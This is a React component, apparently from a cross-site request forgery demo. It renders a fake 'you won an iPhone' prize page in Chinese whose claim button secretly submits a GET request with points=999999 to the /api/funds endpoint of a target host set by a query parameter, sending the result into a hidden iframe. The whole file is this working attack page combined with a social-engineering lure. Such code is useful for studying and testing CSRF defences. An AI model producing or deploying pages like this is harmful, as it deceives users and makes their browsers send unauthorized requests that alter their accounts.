import React from 'react';
import s from './index.module.css';
import axios from 'axios';
class CsrfPage extends React.Component {
    static getInitialProps({query}) {
        return {query}
    }
    render(){
        const {target} = this.props.query;
        return (
            <div className={s.wrapper}>
                <div className={s.iphone}></div>
                <h4 className={s.title}>恭喜你贏得 iPhone 大獎</h4>
                <div className={s.iphone_btn}>
                <form method="GET" action={`http://${target}/api/funds`} target="iframeHidden">
                    <input type="hidden" name="points" value="999999"/>
                    <input type="submit" className="span4 btn btn-primary" value="立刻領取！"/>
                </form>
                </div>
            </div>);
    }
}


export default CsrfPage